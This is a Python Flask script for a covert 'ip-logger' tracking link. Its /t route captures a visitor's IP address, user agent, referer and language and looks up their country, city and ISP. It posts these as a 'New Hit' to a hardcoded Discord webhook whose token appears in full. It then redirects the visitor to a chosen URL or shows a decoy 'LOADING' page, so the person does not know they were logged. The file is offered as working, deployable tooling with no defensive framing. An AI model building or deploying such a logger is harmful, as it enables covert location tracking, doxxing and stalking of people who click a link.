import os
import requests
from flask import Flask, request, redirect, Response

app = Flask(__name__)

WEBHOOK = https://discord.com/api/webhooks/1571455646560288778/NxJFzUWwmTXQMqoaIYe1E17RnO4emiPuIBmyzScnLOflK2Z6DsTj41tEzB0Jd3vmH4M3


def get_ip(req):
    fwd = req.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return req.remote_addr or "unknown"


def lookup(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields": "status,country,regionName,city,isp,org,as,query"},
            timeout=5,
        )
        return r.json()
    except Exception:
        return {"status": "fail"}


def send_webhook(ip, ua, referer, lang, geo, target=None):
    if not WEBHOOK:
        return

    embed = {
        "title": "New Hit",
        "color": 0x2ECC71,
        "fields": [
            {"name": "IP", "value": f"`{ip}`", "inline": True},
            {"name": "Country", "value": geo.get("country", "?"), "inline": True},
            {"name": "City", "value": geo.get("city", "?"), "inline": True},
            {"name": "ISP", "value": geo.get("isp", "?"), "inline": True},
            {"name": "Org", "value": geo.get("org", "?"), "inline": True},
            {"name": "ASN", "value": geo.get("as", "?"), "inline": True},
            {"name": "Referer", "value": f"`{referer[:100]}`", "inline": False},
            {"name": "User-Agent", "value": f"```{ua[:200]}```", "inline": False},
            {"name": "Language", "value": lang[:60], "inline": False},
        ],
        "footer": {"text": "ip-logger"},
    }

    payload = {"embeds": [embed]}
    if target and target.startswith(("http://", "https://")):
        payload["content"] = f"[→ redirect]({target})"

    try:
        requests.post(WEBHOOK, json=payload, timeout=5)
    except Exception as e:
        print("webhook failed:", e)


LANDING = """
<!doctype html>
<html><head><meta charset="utf-8"><title>.</title></head>
<body style="background:#0d0d0d;color:#eee;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
<div style="text-align:center">
<h1 style="font-weight:300;letter-spacing:4px">LOADING</h1>
<p style="color:#555">please wait</p>
</div>
</body></html>
"""


@app.route("/t")
def track():
    ip = get_ip(request)
    ua = request.headers.get("User-Agent", "unknown")
    referer = request.headers.get("Referer", "direct")
    lang = request.headers.get("Accept-Language", "unknown")
    target = request.args.get("redirect", "")

    geo = lookup(ip)
    send_webhook(ip, ua, referer, lang, geo, target or None)

    if target and target.startswith(("http://", "https://")):
        return redirect(target, code=302)

    return Response(LANDING, mimetype="text/html")


@app.route("/")
def home():
    return Response("ok", mimetype="text/plain")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
